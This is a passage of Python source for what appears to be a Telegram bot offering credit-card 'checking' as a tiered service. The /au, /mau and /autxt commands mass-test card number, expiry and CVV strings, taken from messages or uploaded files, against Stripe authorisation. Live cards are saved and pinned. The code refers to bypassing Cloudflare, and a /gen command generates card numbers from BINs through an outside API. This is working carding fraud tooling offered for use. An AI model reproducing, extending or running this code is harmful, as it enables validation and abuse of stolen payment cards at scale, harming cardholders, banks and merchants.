            [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]
        ]
        try: 
            await status_msg.edit(final_caption, buttons=final_buttons)
        except: 
            pass
    finally: 
        ACTIVE_RZP_PROCESSES.pop(user_id, None)


@client.on(events.CallbackQuery(pattern=rb"stop_rztxt:(\d+)"))
async def stop_rztxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: 
            can_stop = True
        elif clicking_user_id in ADMIN_ID: 
            can_stop = True
        if not can_stop: 
            return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_RZP_PROCESSES: 
            return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_RZP_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e: 
        await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)


# --- Stripe Auth Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]au(?:\s|$)'))
async def au(event):
    """Single card check using Stripe Auth"""
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 ⌁ 𝙍𝙚𝙫𝟯𝙧𝙨𝙚𝙭 <𝙊𝙛𝙛/𝙞𝙣𝙚>", buttons=buttons)

    asyncio.create_task(process_au_card(event, access_type))

async def process_au_card(event, access_type):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    card = None
    is_premium = await is_premium_user(event.sender_id)
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: 
            card = extract_card(replied_msg.text)
        if not card: 
            if is_premium:
                return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /𝙖𝙪 4111111111111111|12|2025|123")
    else:
        card = extract_card(event.raw_text)
        if not card: 
            if is_premium:
                return await event.reply("𝙉𝙤 𝙘𝙖𝙧𝙙 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /au 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤", parse_mode="markdown")

    loading_msg = await event.reply("🍳")
    start_time = time.time()

    async def animate_loading():
        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
        i = 0
        while True:
            try:
                await loading_msg.edit(emojis[i % 5])
                await asyncio.sleep(0.5)
                i += 1
            except: 
                break

    loading_task = asyncio.create_task(animate_loading())

    try:
        res = await check_card_stripe_auth(card)
        loading_task.cancel()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = res.get("Response", "").lower()
        status_text = res.get("Status", "").lower()

        # Check for Stripe Auth status using API's 'status' field
        is_charged = False
        # Use status_text (from API's 'status' field: Approved/Declined) to determine status
        # Also check response_text for "Succeeded"
        # IMPORTANT: Check requires_action FIRST before approved
        if "requires_action" in response_text or "requires_action" in status_text:
            status_header = "𝟯𝘿𝙎 ✅"
            status_result = "3DS Required"
            is_charged = True
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif "approved" in status_text or "succeeded" in response_text:
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 💎"
            status_result = "Approved"
            is_charged = True
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif "insufficient" in response_text or "insufficient funds" in response_text:
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_result = "Approved (Insufficient Funds)"
            is_charged = True
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif "cloudflare bypass failed" in response_text:
            status_header = " 𝙇𝙊𝙐     𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
            res["Response"] = "Cloudflare spotted 🤡 change site or try again"
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"


        msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Stripe Auth')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝙙𝙨"""

        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if is_charged: 
            await pin_charged_message(event, result_msg)
    except Exception as e:
        loading_task.cancel()
        await loading_msg.delete()
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]mau(?:\s|$)'))
async def mau(event):
    """Mass check using Stripe Auth from text"""
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)

    cards = []
    is_premium = await is_premium_user(event.sender_id)
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: 
            cards = extract_all_cards(replied_msg.text)
        if not cards:
            if is_premium:
                return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙖𝙪 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
    else:
        cards = extract_all_cards(event.raw_text)
        if not cards:
            if is_premium:
                return await event.reply("𝙉𝙤 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")
            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /mau 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨")

    # Apply limit based on user type (admin has no limit)
    user_limit = get_cc_limit(access_type, event.sender_id)
    if len(cards) > user_limit:
        cards = cards[:user_limit]
        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {user_limit} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {user_limit} 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙖𝙪.```")

    asyncio.create_task(process_mau_cards(event, cards))

async def process_mau_cards(event, cards):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    sent_msg = await event.reply(f"```𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")

    batch_size = 10
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        tasks = [check_card_stripe_auth(card) for card in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (card, result) in enumerate(zip(batch, results)):
            if isinstance(result, Exception):
                result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "Stripe Auth"}

            start_time = time.time()
            end_time = time.time()
            elapsed_time = round(end_time - start_time, 2)
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            response_text = result.get("Response", "").lower()
            status_text = result.get("Status", "").lower()

            # Check for Stripe Auth status using API's 'status' field
            is_charged = False
            # IMPORTANT: Check requires_action FIRST before approved
            if "requires_action" in response_text or "requires_action" in status_text:
                status_header = "𝟯𝘿𝙎 ✅"
                status_result = "3DS Required"
                is_charged = True
                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif "approved" in status_text or "succeeded" in response_text:
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 💎"
                status_result = "Approved"
                is_charged = True
                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif "insufficient" in response_text or "insufficient funds" in response_text:
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                status_result = "Approved (Insufficient Funds)"
                is_charged = True
                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif "cloudflare bypass failed" in response_text:
                status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                result["Response"] = "Cloudflare spotted 🤡 change site or try again"
            else:
                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                status_result = "Declined"

            card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Stripe Auth')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
            result_msg = await event.reply(card_msg)
            if is_charged: 
                await pin_charged_message(event, result_msg)
            await asyncio.sleep(0.1)

    await sent_msg.edit(f"```✅ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]autxt(?:\s|$)'))
async def autxt(event):
    """Check CCs from a .txt file using Stripe Auth"""
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)

    user_id = event.sender_id
    if user_id in ACTIVE_STRIPE_PROCESSES: 
        return await event.reply("```𝙔𝙤𝙪𝙧 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 𝘾𝘾 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")

    try:
        if not event.reply_to_msg_id: 
            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙖𝙪𝙩𝙭𝙩```")

        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: 
            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙖𝙪𝙩𝙭𝙩```")

        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: 
                lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: 
                os.remove(file_path)
            except: 
                pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")

        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: 
            return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")

        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)

        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        else: 
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")

        ACTIVE_STRIPE_PROCESSES[user_id] = True
        asyncio.create_task(process_autxt_cards(event, cards))
    except Exception as e:
        ACTIVE_STRIPE_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def process_autxt_cards(event, cards):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"

    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply(f"```𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🍳```")

    try:
        batch_size = 20
        for i in range(0, len(cards), batch_size):
            batch = cards[i:i+batch_size]
            tasks = [check_card_stripe_auth(card) for card in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (card, result) in enumerate(zip(batch, results)):
                if user_id not in ACTIVE_STRIPE_PROCESSES: 
                    break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "Stripe Auth"}

                checked += 1
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)

                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()
                status_text_lower = result.get("Status", "").lower()

                if "3d" in response_text_lower:
                    declined += 1
                    continue

                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False

                # Check for Stripe Auth status using API's 'status' field
                # IMPORTANT: Check requires_action FIRST before approved
                if "requires_action" in response_text_lower or "requires_action" in status_text_lower:
                    charged += 1
                    status_header = "𝟯𝘿𝙎 ✅"
                    await save_approved_card(card, "3DS", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif "approved" in status_text_lower or "succeeded" in response_text_lower:
                    charged += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 💎"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif "insufficient" in response_text_lower or "insufficient funds" in response_text_lower:
                    charged += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED (Insufficient Funds)", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1
                else:
                    declined += 1
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

                if should_send_message:
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Stripe Auth')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
                    result_msg = await event.reply(card_msg)
                    # Pin if approved
                    if "approved" in status_text_lower:
                        await pin_charged_message(event, result_msg)

                buttons = [
                    [Button.inline(f"𝗖𝗮𝗿𝗱 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result.get('Response')[:25]}...", b"none")],
                    [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_autxt:{user_id}".encode())]
                ]
                try: 
                    await status_msg.edit("```𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🍳...```", buttons=buttons)
                except: 
                    pass
                await asyncio.sleep(0.1)

        final_caption = f"""✅ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
"""
        final_buttons = [
            [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], 
            [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], 
            [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], 
            [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]
        ]
        try: 
            await status_msg.edit(final_caption, buttons=final_buttons)
        except: 
            pass
    finally: 
        ACTIVE_STRIPE_PROCESSES.pop(user_id, None)


@client.on(events.CallbackQuery(pattern=rb"stop_autxt:(\d+)"))
async def stop_autxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: 
            can_stop = True
        elif clicking_user_id in ADMIN_ID: 
            can_stop = True
        if not can_stop: 
            return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_STRIPE_PROCESSES: 
            return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_STRIPE_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e: 
        await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)



# --- Card Generator Functions ---

CC_GEN_ENDPOINT = "https://drlabapis.onrender.com/api/ccgenerator"

async def generate_cards_api(bin_input, count=10):
    """Generate cards using the external API"""
    try:
        url = f"{CC_GEN_ENDPOINT}?bin={bin_input}&count={count}"
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return None, f"API Error: HTTP {res.status}"

                # API returns plain text, not JSON
                text = await res.text()
                cards = [line.strip() for line in text.strip().split('\n') if line.strip()]

                if not cards:
                    return None, "No cards generated"

                return cards, {"count": len(cards)}
    except Exception as e:
        return None, str(e)

def format_gen_cards(cards):
    """Format cards in code blocks"""
    return '\n'.join([f"<code>{card}</code>" for card in cards])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]gen(?:\s|$)'))
async def gen(event):
    """Generate credit cards from BIN/extrap"""
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)

    try:
        args = event.raw_text.split()
        if len(args) < 2:
            return await event.reply(
                "<b>Usage:</b> <code>/gen {bin/extrap}</code> <code>{amount (optional)}</code>\n\n"
                "<b>Examples:</b>\n"
                "<code>/gen 414720</code>\n"
                "<code>/gen 414720|12|27|xxx</code>\n"
                "<code>/gen 414720xxxxxxxxxx|12|27 20</code>",
                parse_mode='html'
            )

        bin_input = args[1]
        count = int(args[2]) if len(args) > 2 and args[2].isdigit() else 10

        # Limit max cards
        if count > 500:
            count = 500
            await event.reply("<b>Max limit is 500 cards. Generating 500 cards...</b>", parse_mode='html')

        # Validate BIN format
        bin_clean = bin_input.replace("|", "").replace("x", "").replace("X", "")
        if len(bin_clean) < 6 or not bin_clean[:6].isdigit():
            return await event.reply("<b>Invalid BIN format. Use:</b> <code>414720</code> <b>or</b> <code>414720|12|27|xxx</code>", parse_mode='html')

        loading_msg = await event.reply("<b>Generating cards...</b>", parse_mode='html')

        cards, info = await generate_cards_api(bin_input, count)

        if cards is None:
